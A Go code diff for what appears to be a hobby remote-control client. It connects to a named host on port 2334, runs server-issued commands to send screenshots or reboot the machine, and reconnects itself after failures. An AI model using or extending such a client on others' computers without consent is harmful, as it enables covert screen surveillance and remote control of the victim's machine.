@@ -2,55 +2,66 @@ package main
 
 import (
 	"./serverDir"
+	//"./fileReg"
 	"time"
+
+	"syscall"
 	"fmt"
 )
 func main(){
 	//start()
 	//fileReg.Relocate()
-	//start_client()
-	fmt.Println(serverDir.ShowCursor(false))
+	start_client()
 
-	time.Sleep(time.Second*3)
-
-	serverDir.ShowCursor(true)
 
 }
 
 
 var(
 	specialFuncsAccess map[string]func() = make(map[string]func())
+	clien *serverDir.Client = nil
 )
 
 func start_client(){
-	var cont bool = true
-	for cont{
-		client := serverDir.StartClient(2334, "LAPTOP-ARK617N3")
-		if(client==nil){
-			time.Sleep(time.Second*5)
-			continue;
-		}
-		specialFuncsAccess["ping"] = client.Ping
-		specialFuncsAccess["screen"] = client.InitiateScrenShotSendingProcess
+	defer revcovery()
 
-		for !client.DC{
-			content := string(client.KeepReadingLinesUntilDelim(serverDir.KNOWN_DELIM))
-			if(content=="DC"){
-				break;
-			}
-			if (content == "exit") {
-				cont= false
-				break;
-			}
-			if val, exists := specialFuncsAccess[content]; exists {
-				val()
-			} else {
-				client.Ignore()
-			}
 
-		}
-		client.Close()
+	clien = serverDir.StartClient(2334, "LAPTOP-ARK617N3")
+	clien.SetReadDeadline()
+	specialFuncsAccess["ping"] = clien.Ping
+	specialFuncsAccess["screen"] = clien.InitiateScrenShotSendingProcess
+	specialFuncsAccess["reboot"] = clien.Reboot
+	specialFuncsAccess["exit"] = func(){
+		clien.Close()
+		syscall.Exit(0)
 	}
+	for {
+		content := string(clien.KeepReadingLinesUntilDelim(serverDir.KNOWN_DELIM))
+		fmt.Println(content)
+		if val, exists := specialFuncsAccess[content]; exists {
+			val()
+		} else {
+			clien.Ignore()
+		}
+
+	}
+	clien.Close()
+	panic("DC")
+
 }
+
+func revcovery(){
+	if r:=recover();r!=nil{
+		if(clien!=nil){
+			clien.Close()
+		}
+		time.Sleep(time.Second*1)
+		start_client()
+	}
+
+}
+
+
+
 
 
